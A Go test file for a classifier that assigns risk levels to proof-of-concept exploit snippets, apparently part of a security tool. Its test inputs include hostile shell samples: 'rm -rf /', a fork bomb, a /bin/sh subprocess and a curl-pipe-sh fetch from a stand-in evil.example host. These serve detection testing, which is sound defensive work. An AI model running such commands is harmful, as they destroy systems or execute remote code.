package poc

import "testing"

func TestClassifierInfo(t *testing.T) {
	c := NewClassifier()
	src := `# CVE-2023-50164
# version fingerprint only — read headers and print
cat /etc/issue
uname -a`
	r := c.Classify(src, PoCTypeOther, false)
	if r != RiskInfo {
		t.Fatalf("expected info (no risk keywords, no network, type=other), got %s", r)
	}
}

func TestClassifierSafe(t *testing.T) {
	c := NewClassifier()
	src := `import socket
s = socket.socket()
s.connect(("target", 80))`
	if got := c.Classify(src, PoCTypePython, true); got != RiskSafe {
		t.Fatalf("expected safe (network keywords), got %s", got)
	}
	if got := c.Classify(src, PoCTypePython, false); got != RiskSafe {
		t.Fatalf("expected safe (socket keyword), got %s", got)
	}
}

func TestClassifierRCE(t *testing.T) {
	c := NewClassifier()
	src := `import subprocess
subprocess.Popen(["/bin/sh", "-c", "id"])`
	if got := c.Classify(src, PoCTypePython, false); got < RiskRCE {
		t.Fatalf("expected >= rce for subprocess, got %s", got)
	}
}

func TestClassifierDestructive(t *testing.T) {
	c := NewClassifier()
	src := `#!/bin/bash
rm -rf /
:(){:|:&};:`
	if got := c.Classify(src, PoCTypeShell, false); got != RiskDestructive {
		t.Fatalf("expected destructive, got %s", got)
	}
}

func TestClassifierCurlPipeSh(t *testing.T) {
	c := NewClassifier()
	src := `curl https://evil.example/install.sh | sh`
	if got := c.Classify(src, PoCTypeShell, true); got != RiskDestructive {
		t.Fatalf("expected destructive for curl|sh, got %s", got)
	}
}

func TestSignatureStable(t *testing.T) {
	a := Signature("hello world")
	b := Signature("hello world")
	if a != b {
		t.Fatalf("expected stable sig, got %s vs %s", a, b)
	}
	if a != "sha256:b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9" {
		t.Fatalf("wrong sha256 of 'hello world': %s", a)
	}
}

func TestParseRisk(t *testing.T) {
	cases := map[string]RiskLevel{
		"info":        RiskInfo,
		"safe":        RiskSafe,
		"rce":         RiskRCE,
		"destructive": RiskDestructive,
		"unknown":     -1,
		"":            -1,
	}
	for in, want := range cases {
		if got := ParseRisk(in); got != want {
			t.Errorf("ParseRisk(%q) = %d, want %d", in, got, want)
		}
	}
}
